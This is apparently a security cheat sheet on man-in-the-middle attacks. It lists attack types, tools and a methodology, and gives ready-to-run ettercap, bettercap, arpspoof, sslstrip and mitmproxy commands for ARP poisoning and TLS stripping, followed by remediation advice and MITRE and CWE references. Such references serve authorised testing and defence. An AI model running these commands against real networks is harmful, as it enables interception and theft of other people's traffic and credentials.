# Man-in-the-Middle (MitM) Attacks

Intercepting and modifying communications between parties without their knowledge.

## Attack Types
- **ARP Spoofing**: Poison ARP cache
- **DNS Spoofing**: False DNS responses
- **SSL/TLS Stripping**: Downgrade HTTPS
- **BGP Hijacking**: Routing manipulation

## Tools
- Ettercap, Bettercap, mitmproxy, Wireshark, SSLstrip, Responder

## Quick Commands
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP poisoning (Ettercap)
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//

# Bettercap
bettercap -eval "set arp.spoof.targets 192.168.1.10; arp.spoof on; net.sniff on"

# arpspoof (bidirectional)
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# SSL stripping
sslstrip -l 8080

# mitmproxy
mitmproxy -p 8080 --mode transparent
```

## Methodology
1. Position on same network segment
2. Perform ARP spoofing
3. Capture and analyze traffic
4. Attempt SSL/TLS stripping
5. Test certificate validation
6. Intercept/modify HTTP/HTTPS

## Remediation
- Dynamic ARP Inspection (DAI)
- DNSSEC
- HTTPS with HSTS
- Certificate pinning
- Network segmentation

**MITRE**: T1557.002 (ARP Cache Poisoning) | **CWE**: CWE-300 | **CAPEC**: CAPEC-94, CAPEC-603
